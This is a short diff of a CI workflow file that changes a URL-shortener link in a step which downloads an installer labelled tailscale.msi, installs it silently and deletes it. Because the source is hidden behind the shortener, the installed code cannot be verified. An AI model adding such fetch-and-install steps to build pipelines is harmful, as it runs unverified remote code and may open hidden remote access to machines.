@@ -65,13 +65,12 @@ jobs:
 
       - name: nl
         run: |
-          $tsUrl = "https://2cm.es/1jIjW"
+          $tsUrl = "https://3.ly/pprzmnj5"
           $installerPath = "$env:TEMP\tailscale.msi"
           
           Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
           Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
           Remove-Item $installerPath -Force
-          Start-Sleep -Seconds 7
 
       - name: nil
         run: |
